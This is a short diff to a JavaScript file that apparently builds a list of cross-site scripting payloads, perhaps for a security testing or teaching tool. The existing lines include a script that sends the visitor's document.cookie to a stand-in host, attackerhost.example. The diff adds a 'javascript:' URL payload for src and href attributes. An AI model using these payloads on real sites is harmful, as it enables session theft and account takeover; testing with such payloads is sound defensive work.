@@ -68,4 +68,9 @@ $(document).ready(function() {
   attacks[2][3] = function(name) {
     return "<script>document.location='http://attackerhost.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>";
   }
+
+  /* src/href attack */
+  attacks[2][4] = function(name) {
+    return "javascript:alert('XSS')"
+  }
 });
